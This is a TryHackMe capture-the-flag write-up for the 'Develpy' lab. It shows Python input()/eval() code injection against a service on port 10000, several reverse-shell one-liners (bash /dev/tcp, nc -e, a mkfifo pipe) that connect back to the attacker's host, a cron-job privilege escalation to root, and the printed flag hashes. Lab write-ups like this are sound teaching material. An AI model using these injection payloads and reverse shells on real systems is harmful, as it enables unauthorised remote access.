---
title: "Tryhackme - Develpy WriteUp"
date: 2020-10-23
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---


# TryHackMe - Develpy WriteUp


**Keywords**: python code injection, python code execution, eval(), exec(), input()


## Information Gathering

### nmap

```
root@kali:~/TryHackMe# nmap -p- -sC -sV -vv -A -T4 10.10.227.39
PORT      STATE SERVICE           REASON         VERSION
22/tcp    open  ssh               syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
10000/tcp open  snet-sensor-mgmt? syn-ack ttl 63
```

**Web-site on port 10000**

```
http://10.10.227.39:10000/
```

```

        Private 0days

 Please enther number of exploits to send??: Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'GET' is not defined

```


### netcat

```
root@kali:~/TryHackMe# nc 10.10.227.39 10000

        Private 0days

 Please enther number of exploits to send??: 5

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.00 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.016 ms
Exploiting tryhackme internal network: beacons_seq=3 ttl=1337 time=0.076 ms
Exploiting tryhackme internal network: beacons_seq=4 ttl=1337 time=0.04 ms
Exploiting tryhackme internal network: beacons_seq=5 ttl=1337 time=0.080 ms
```

Works like `ping` command.


<a href="https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1">Python Input Code Injection</a>


Using these functions we can bypass authentication and inject a code.

```
eval()
exec()
input()
```

**eval()**

	-	takes strings and execute them as code


```
eval("__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#")
```


**exec()**
	-	similar to eval


**input()**


## Exploit

```
root@kali:~/TryHackMe# echo "__import__('os').system('nc -e /bin/bash 10.11.19.26 1234')" | nc 10.10.227.39 10000

        Private 0days

 Please enther number of exploits to send??:
```

**OR**

```
root@kali:~/TryHackMe# nc 10.10.227.39 10000

        Private 0days

 Please enther number of exploits to send??: eval('__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.19.26 1234 >/tmp/f")')
rm: cannot remove '/tmp/f': No such file or directory
```


### netcat

```
root@kali:~/TryHackMe# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.11.19.26] from (UNKNOWN) [10.10.227.39] 38600
python -c "import pty; pty.spawn('/bin/bash')"
king@ubuntu:~$ 
```


**user.txt**

```
king@ubuntu:~$ ls -la
ls -la
total 324
drwxr-xr-x 4 king king   4096 Aug 27  2019 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      5 Oct 22 05:20 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
king@ubuntu:~$ cat user.txt
cat user.txt
cf85ff769cfaaa721758949bf870b019
king@ubuntu:~$ 
```


## Privilege Escalation


```
king@ubuntu:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
#
king@ubuntu:~$ ls -la
ls -la
total 324
drwxr-xr-x 4 king king   4096 Aug 27  2019 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      5 Oct 22 05:25 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
```

```
king@ubuntu:~$ cat root.sh
cat root.sh
bash -i >& /dev/tcp/10.11.19.26/1235 0>&1
king@ubuntu:~$ 

```


```

root@kali:~# nc -nvlp 1235
listening on [any] 1235 ...
connect to [10.11.19.26] from (UNKNOWN) [10.10.227.39] 53342
bash: cannot set terminal process group (2126): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/king# cd
cd
root@ubuntu:~# ls
ls
company
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
9c37646777a53910a347f387dce025ec
root@ubuntu:~# 
```
